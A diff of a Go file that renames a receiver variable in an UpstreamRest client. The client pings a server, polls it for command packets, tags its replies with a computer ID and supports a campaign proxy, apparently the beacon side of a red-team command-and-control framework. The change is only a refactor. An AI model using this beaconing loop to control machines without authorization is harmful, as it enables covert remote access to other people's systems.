@@ -43,8 +43,8 @@ func MakeUpstreamRest(config *ClientConfig, campaign *campaign.Campaign) Upstrea
 }
 
 // Connect creates a REST connection to the server, or returns an error
-func (d *UpstreamRest) Connect() error {
-	proxyUrl, ok := d.campaign.GetProxy()
+func (u *UpstreamRest) Connect() error {
+	proxyUrl, ok := u.campaign.GetProxy()
 	if ok {
 		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
 			proxyUrlFunc := http.ProxyURL(proxyUrl)
@@ -58,8 +58,8 @@ func (d *UpstreamRest) Connect() error {
 	// Build a empty ping packet to test
 	arguments := make(model.PacketArgument)
 	response := make(model.PacketResponse)
-	packet := d.config.MakeClientPacket("ping", arguments, response)
-	err := d.sendPacket(*packet)
+	packet := u.config.MakeClientPacket("ping", arguments, response)
+	err := u.sendPacket(*packet)
 	if err != nil {
 		return err
 	}
@@ -68,14 +68,14 @@ func (d *UpstreamRest) Connect() error {
 }
 
 // Start is a Thread responsible for receiving packets from server, lifetime:app
-func (d *UpstreamRest) Start() {
+func (u *UpstreamRest) Start() {
 	go func() {
 
 		for {
-			time.Sleep(d.packetGetTimer.getSleepDuration())
+			time.Sleep(u.packetGetTimer.getSleepDuration())
 
 			// Try getting a packet from server
-			packet, err := d.GetPacket()
+			packet, err := u.GetPacket()
 			if err != nil {
 				if err == ErrNoPacketsFound {
 					fmt.Print(".")
@@ -88,23 +88,23 @@ func (d *UpstreamRest) Start() {
 				continue
 			}
 			// Notify state that we received a packet
-			d.packetGetTimer.tick()
+			u.packetGetTimer.tick()
 
 			// Send it to Client
-			d.ChanIncoming() <- packet
+			u.ChanIncoming() <- packet
 		}
 
 	}()
 
 	go func() {
 		for {
-			packet, ok := <-d.ChanOutgoing()
+			packet, ok := <-u.ChanOutgoing()
 			if !ok {
 				break
 			}
 
 			// Send answer to server
-			err := d.sendPacket(packet)
+			err := u.sendPacket(packet)
 			if err != nil {
 				log.Errorf("UpstreamRest: Could not send packet from ChanOutgoing to server via REST: %s", err.Error())
 			}
@@ -112,9 +112,9 @@ func (d *UpstreamRest) Start() {
 	}()
 }
 
-func (d *UpstreamRest) GetPacket() (model.Packet, error) {
-	url := d.PacketGetUrl()
-	resp, err := d.HttpGet(url)
+func (u *UpstreamRest) GetPacket() (model.Packet, error) {
+	url := u.PacketGetUrl()
+	resp, err := u.HttpGet(url)
 	if err != nil {
 		return model.Packet{}, fmt.Errorf("could not request URL %s: %s", url, err)
 	}
@@ -130,27 +130,27 @@ func (d *UpstreamRest) GetPacket() (model.Packet, error) {
 	if len(bodyBytes) <= 0 {
 		return model.Packet{}, ErrNoPacketsFound
 	}
-	packet, err := d.coder.DecodeData(bodyBytes)
+	packet, err := u.coder.DecodeData(bodyBytes)
 	if err != nil {
 		return model.Packet{}, fmt.Errorf("UpstreamRest: Error antnium decoding of body from URL %s: %s", url, err)
 	}
 	return packet, nil
 }
 
-func (d *UpstreamRest) sendPacket(packet model.Packet) error {
-	url := d.PacketSendUrl()
+func (u *UpstreamRest) sendPacket(packet model.Packet) error {
+	url := u.PacketSendUrl()
 
 	// Setup response
-	packet.ComputerId = d.config.ComputerId
+	packet.ComputerId = u.config.ComputerId
 
 	common.LogPacket("UpstreamRest:send()", packet)
 
-	data, err := d.coder.EncodeData(packet)
+	data, err := u.coder.EncodeData(packet)
 	if err != nil {
 		return fmt.Errorf("could not send answer to URL %s: %s", url, err.Error())
 	}
 
-	resp, err := d.HttpPost(url, bytes.NewReader(data))
+	resp, err := u.HttpPost(url, bytes.NewReader(data))
 	if err != nil {
 		return err
 	}
@@ -163,13 +163,13 @@ func (d *UpstreamRest) sendPacket(packet model.Packet) error {
 }
 
 // Connected returns false if we know that that websocket connection is dead
-func (d *UpstreamRest) Connected() bool {
+func (u *UpstreamRest) Connected() bool {
 	return true
 }
 
-func (d *UpstreamRest) ChanIncoming() chan model.Packet {
-	return d.chanIncoming
+func (u *UpstreamRest) ChanIncoming() chan model.Packet {
+	return u.chanIncoming
 }
-func (d *UpstreamRest) ChanOutgoing() chan model.Packet {
-	return d.chanOutgoing
+func (u *UpstreamRest) ChanOutgoing() chan model.Packet {
+	return u.chanOutgoing
 }
